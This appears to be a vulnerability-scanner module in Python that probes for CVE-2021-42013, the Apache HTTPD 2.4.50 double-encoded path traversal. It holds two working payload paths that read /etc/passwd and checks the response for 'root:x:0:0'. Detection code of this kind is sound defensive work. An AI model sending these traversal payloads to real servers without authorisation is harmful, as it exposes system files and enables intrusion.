"""CVE-2021-42013 - Apache HTTPD 2.4.50 Path Traversal (double encoded)."""
from .base import CVEDetector, CVEResult


class Apache2450Traversal(CVEDetector):
    cve_id = "CVE-2021-42013"
    title = "Apache HTTPD 2.4.50 Path Traversal (double-encoded)"
    severity = "critical"
    affected = "Apache HTTPD 2.4.50"
    tags = ["cve-2021-42013", "apache", "path-traversal", "rce-potential"]

    PATHS = [
        "/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
        "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
    ]

    def probe(self, base, baseline_body):
        for p in self.PATHS:
            status, body = self._get(base + p, timeout=6)
            if not body or len(body) < 30:
                continue
            if "root:x:0:0" in body and "root:x:0:0" not in baseline_body:
                return CVEResult(
                    vulnerable=True,
                    url=base + p,
                    evidence="root:x:0:0 reflected (double-encoded bypass)",
                    detail=f"Apache 2.4.50 double-encoded path traversal via {p}",
                )
        return None
